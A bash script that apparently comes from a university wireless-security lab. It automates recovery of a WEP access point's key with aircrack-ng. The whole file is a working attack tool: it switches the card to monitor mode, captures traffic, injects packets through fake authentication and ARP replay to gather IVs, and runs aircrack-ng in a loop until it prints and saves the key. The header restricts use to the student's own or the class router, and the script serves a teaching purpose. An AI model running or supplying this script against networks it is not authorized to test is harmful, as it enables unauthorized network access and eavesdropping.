#!/usr/bin/env bash
#
# wep-crack.sh — authorized WEP key-recovery automation (Lab #10, CS VIII)
#
# Drives the standard aircrack-ng flow against a WEP access point you are
# authorized to test (your own GL-AR300M16, or the class router during the
# evaluation window). WEP falls to a statistical/PTW attack on captured IVs —
# NO dictionary is used, which is the whole point of the lab.
#
#   active  mode: monitor -> injection test against the target -> fake-auth -> ARP
#                 replay. Needs a card that injects reliably against the target.
#                 This is what recovers the key fast.
#   passive mode: monitor + capture only. Works on any card that can monitor
#                 (e.g. the Intel AC8260). Good for practice and for the analysis
#                 half of the writeup.
#
# Usage:
#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
#
# Example:
#   sudo ./scripts/wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
#
# Monitor mode, the capture and the WiFi recovery come from wifi-lib.sh, the same
# code that airodump.sh and injection-test.sh use. Cleanup runs on exit, including
# Ctrl-C. If WiFi still stays dark, run ./scripts/wifi-recover.sh -i <iface>.
#
set -u

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LAB_DIR=$(cd "$SCRIPT_DIR/.." && pwd)
LOGDIR="$LAB_DIR/logs"
AIRMON_LOG="$LOGDIR/airmon.log"
# shellcheck source=wifi-lib.sh
source "$SCRIPT_DIR/wifi-lib.sh"

# ---- defaults -------------------------------------------------------------
IFACE=""
BSSID=""
CHANNEL=""
ESSID=""
MODE="active"
PREFIX="wepcap"
IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)

while getopts ":i:b:c:e:m:o:t:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    b) BSSID="$OPTARG" ;;
    c) CHANNEL="$OPTARG" ;;
    e) ESSID="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    o) PREFIX="$OPTARG" ;;
    t) IV_TARGET="$OPTARG" ;;
    h) usage 0 ;;
    *) usage ;;
  esac
done

# ---- preflight ------------------------------------------------------------
wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemctl
[[ -n "$IFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
[[ "$MODE" == "active" || "$MODE" == "passive" ]] || die "-m must be active|passive"
[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
wifi_require_iface "$IFACE"

# ---- output location ------------------------------------------------------
# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
mkdir -p "$LOGDIR"
: > "$AIRMON_LOG"
OUT="${LOGDIR}/${PREFIX}"
KEYFILE="${OUT}.key"
# An old key file with this prefix would look like a new result, so it goes with the old capture.
rm -f "${OUT}"-*.cap "${OUT}"-*.csv "$KEYFILE" 2>/dev/null

# ---- start capture --------------------------------------------------------
wifi_guard "$IFACE"
wifi_monitor_start "$IFACE"
wifi_set_channel "$CHANNEL"

echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
airodump_start "$OUT" "$CHANNEL" "$BSSID" bg
sleep 4

# ---- active injection -----------------------------------------------------
if [[ "$MODE" == "active" ]]; then
  MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
  echo "[*] Verifying injection against the target $BSSID..."
  if inject_test "$MON" "${OUT}-injection.txt" "$BSSID" >/dev/null; then
    echo "[*] Target answered $(ap_ratio "${OUT}-injection.txt" "$BSSID") probes."
  else
    echo "[!] Injection test did NOT pass: $BSSID did not answer on $IFACE."
    echo "    Replies per AP are in ${OUT}-injection.txt. Falling back to PASSIVE capture."
    echo "    Active mode needs a card that injects against this AP."
    MODE="passive"
  fi
fi

if [[ "$MODE" == "active" ]]; then
  echo "[*] Associating with AP (fake auth)..."
  # keep re-authenticating every 10s so we stay associated. --ignore-negative-one: aireplay-ng
  # cannot read the monitor channel that wifi_set_channel set, and without the flag it exits.
  # Run from logs/, so the replay_arp-*.cap it writes lands there. stdbuf keeps the logs current.
  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --fakeauth 10 -o 1 -q 10 \
      -a "$BSSID" -h "$MYMAC" ${ESSID:+-e "$ESSID"} "$MON" ) >"${OUT}-fakeauth.txt" 2>&1 &
  fakeauth_pid=$!
  track_pid "$fakeauth_pid"

  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" ) \
    >"${OUT}-arpreplay.txt" 2>&1 &
  arp_pid=$!
  track_pid "$arp_pid"
else
  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
fi

# ---- crack loop -----------------------------------------------------------
echo "[*] IVs: captured IVs. IV/s: new IVs per second. ARP req: ARP requests captured for replay."
echo "    ACK: frames the AP acknowledged. TX: frames our card sent."
echo "[*] Progress every ${RETRY_SECS}s. aircrack-ng tries the key at ${MIN_IVS} IVs, then every ${IV_TARGET} more."
echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
prev_iv=0                # #Data at the last progress line, for the rate
while true; do
  sleep "$RETRY_SECS"
  CSV="${OUT}-01.csv"
  ivs=0
  if [[ -f "$CSV" ]]; then
    # column 11 ("# IV") on the AP row matching our BSSID
    ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
    ivs=${ivs:-0}
  fi
  # Latest ARP replay counters, from the last status line aireplay-ng printed.
  replay=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'got ' | tail -n 1 |
    sed -E 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/')
  echo "    $(date +%H:%M:%S)  IVs ${ivs} (+$(( (ivs - prev_iv) / RETRY_SECS )) IV/s)  ${replay}"
  prev_iv=$ivs
  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
    last_iv=$ivs
    echo "    [*] trying the key at ${ivs} IVs (up to 60 s)..."
    # -n 128: a 13-character (104-bit) WEP key. -b: the capture can hold other networks.
    # timeout: a failed try can wait or brute-force for minutes and would freeze this loop; a
    # timed-out try is retried at the next IV_TARGET step.
    if timeout -k 5 60 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
      echo
      echo "============================================================"
      echo " KEY RECOVERED: $(cat "$KEYFILE")"
      echo " Saved to: $KEYFILE   Capture: ${OUT}-01.cap"
      echo "============================================================"
      exit 0
    fi
  fi
done
